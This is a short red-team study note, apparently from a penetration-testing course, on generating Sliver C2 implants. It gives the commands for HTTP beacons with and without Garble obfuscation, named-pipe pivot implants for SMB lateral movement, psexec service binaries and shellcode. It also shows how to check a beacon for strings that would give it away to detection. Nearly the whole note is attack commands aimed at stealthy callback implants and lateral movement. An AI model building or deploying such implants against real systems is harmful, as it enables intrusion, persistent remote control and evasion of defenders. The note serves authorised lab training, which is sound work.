# 15.04 Beacon Generation

> Build HTTP/S beacons or named-pipe pivot implants — `--skip-symbols` is fast but leaks Sliver paths via `strings`.

## Overview

Generate HTTP/HTTPS beacons or named-pipe pivot implants. --skip-symbols speeds compilation but leaves plaintext Sliver import paths visible via `strings`. Obfuscated builds are ~17 MB vs ~11 MB. -N names the implant. -S sets callback interval; -J sets jitter.

## Steps

- `generate beacon --http` creates an HTTP(S) beacon; specify IP:port for the listener.
- Omitting `--skip-symbols` enables Garble obfuscation (default); adds ~6 MB but hides strings.
- Verify strings leakage: `strings http-beacon-skipSymbols.exe | grep sliver | tail -10`.
- `generate --named-pipe` creates a pivot implant for SMB lateral movement.
- `generate --format service` creates a service binary for psexec lateral movement.
- `generate --format shellcode` creates shellcode for use with profiles/backdoor command.

## Commands

### HTTP beacon skip-symbols (fast, less stealthy)

```text
sliver > generate beacon --http 127.0.0.1 --skip-symbols -N http_beacon --os windows
```

### HTTP beacon obfuscated

```text
sliver > generate beacon --http 127.0.0.1 -N http_beacon_obfuscated --os windows
```

### HTTP beacon for assumed-breach lab

```text
sliver > generate beacon --http 10.10.14.62:9001 --skip-symbols --os windows -N http-beacon-9001
```

### Named-pipe pivot implant

```text
sliver > generate --named-pipe 127.0.0.1/pipe/academy -N pipe_academy --skip-symbols
```

### Service format for psexec

```text
sliver (http-beacon) > generate --format service -i <TARGET>:9898 --skip-symbols -N psexec-pivot
```

### Check obfuscation leakage

```bash
strings http-beacon-skipSymbols.exe | grep sliver | tail -10
```
